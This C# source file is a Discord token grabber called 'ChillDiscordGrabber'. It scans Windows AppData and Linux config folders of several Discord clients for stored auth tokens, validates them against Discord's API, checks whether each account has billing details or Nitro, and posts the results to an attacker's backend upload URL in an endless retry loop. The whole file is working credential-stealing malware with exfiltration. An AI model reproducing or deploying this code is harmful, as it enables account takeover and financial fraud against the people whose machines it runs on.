using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;
using System.Threading;

namespace ChillDiscordGrabber
{
    class Program
    {
        //Currently supports
        //Windows Discord
        //Linux Discord and Canary Discord from Official Repos and snapd
        //Discord Arch Electron
        //Ripcord - Not fully tested
        //DiscordQT
        //GORD

        static User user = new User();
        static void Main(string[] args)
        {
            if (OperatingSystem.IsWindows())
            {
                //Im too lazy to install all possible discord verions for windows so the program searches the entire appdata
                GetTokens(new string[] { Environment.GetEnvironmentVariable("USERPROFILE") + "\\AppData" });
            }
            if (OperatingSystem.IsLinux())
            {
                string[] Paths = new string[] {
                    $"/home/{Environment.UserName}/.config/discord/",
                    $"/home/{Environment.UserName}/.config/discordcanary/",
                    $"/home/{Environment.UserName}/snap/discord/",
                    $"/home/{Environment.UserName}/snap/discord-canary/",
                    $"/home/{Environment.UserName}/.config/Lightcord/"
                };
                GetTokens(Paths);
                GetLinuxClientsTokens();
            }


            //To implement uploading the data to a backend
            //File.WriteAllText("out.json", JsonConvert.SerializeObject(user));
            Upload:
            try
            {
                UploadData.PostUpload(JsonConvert.SerializeObject(user), $"{Settings.BackendUrl}/upload");
            }
            catch
            {
                GC.Collect(0);
                Thread.Sleep(60000);
                goto Upload;
            }
        }

        //Atm is tested when Ripcord only has discord accounts
        //Needs more testing...
        public static void GetLinuxClientsTokens()
        {
            GetRipcordTokens();
            GetDiscordQTTokens();
            GetGordToken();
        }

        private static void GetGordToken()
        {
            string GordPath = $"/home/{Environment.UserName}/.config/gord/config.json";
            if (!File.Exists(GordPath)) return;
            dynamic json = JObject.Parse(File.ReadAllText(GordPath));
            AddTokenIfValid(json["Token"].ToString());
        }

        private static void GetDiscordQTTokens()
        {
            string JsonPath = $"/home/{Environment.UserName}/.config/discord-qt/config.json";
            //JsonPath = "config.json"; //for windows debugging

            if (!File.Exists(JsonPath))
                return;

            dynamic JsonContent = JObject.Parse(File.ReadAllText(JsonPath));

            foreach (var acc in JsonContent["accounts"])
                AddTokenIfValid(acc["token"].ToString());
        }

        private static void GetRipcordTokens()
        {
            string RipcordPath = $"/home/{Environment.UserName}/.local/share/Ripcord/ripcord_accounts.bin";
            //RipcordPath = "ripcord_accounts.bin"; //for testing on windows machine
            if (!File.Exists(RipcordPath)) return;

            string[] ripcordFileLines = StringUtils.RemoveInvalidTokenCharacters(File.ReadAllText(RipcordPath)).Split('\n');

            for (int i = 1; i < ripcordFileLines.Length; i++)
            {
                if (ripcordFileLines[i - 1].Contains("auth_token"))
                {
                    string token = StringUtils.RemoveEverythingAfterFirstIncluding(ripcordFileLines[i], "user_name");
                    if (token.Length == 60)
                        AddTokenIfValid(token.Remove(0, 1));
                    else
                        AddTokenIfValid(token);
                }

            }
        }

        //Standard get tokens function from .ldb files from specified paths
        public static void GetTokens(string[] Paths)
        {
            List<string> LdbPaths = new List<string>();

            //Seach all paths from Paths argument for ldb files
            foreach (var path in Paths)
            {
                if (!Directory.Exists(path)) continue;

                List<string> TempLdbPath = new List<string>();
                SearchForLdb(path, ref TempLdbPath);
                LdbPaths.AddRange(TempLdbPath);
            }

            //Seach the token in each file
            foreach (string file in LdbPaths)
            {
                string rawText = File.ReadAllText(file);

                if (!rawText.Contains("oken")) continue;

                foreach (Match match in Regex.Matches(rawText, "[^\"]*"))
                {
                    if (match.Length != 59 && match.Length!=60 && match.Length != 89 && match.Length != 88 && match.Length!=90)
                        continue;
                    AddTokenIfValid(match.ToString());
                }
            }
        }
        
        //Add token to the list only if it's a valid token
        public static void AddTokenIfValid(string token)
        {
            //If the token is already in the list
            //or it cotains unaccepted characters
            //or if the token isnt valid (using discord api) exit the function
            if (user.discordInfo.Tokens.Contains(token) || !StringUtils.isValidTokenString(token) || !DiscordApi.IsTokenValid(token))
                return;

            user.discordInfo.Tokens.Add(token);

            Thread.Sleep(Settings.SleepBetweenRequestsInMs);

            user.discordInfo.HasCC.Add(DiscordApi.HasBilling(token));

            Thread.Sleep(Settings.SleepBetweenRequestsInMs);

            user.discordInfo.HasNitro.Add(DiscordApi.HasNitro(token));

            Thread.Sleep(Settings.SleepBetweenRequestsInMs);
        }

        //Recursive search for .ldb files
        public static void SearchForLdb(string path, ref List<string> files)
        {
            try
            {
                string[] CurrentFiles = Directory.GetFiles(path);
                string[] childDirectories = Directory.GetDirectories(path);
                for (int i = 0; i < CurrentFiles.Length; i++)
                    if (Path.GetExtension(CurrentFiles[i])==".ldb")
                        files.Add(CurrentFiles[i]);
                for (int i = 0; i < childDirectories.Length; i++)
                    SearchForLdb(childDirectories[i], ref files);
            }
            catch (Exception)
            {
            }
        }

    }
}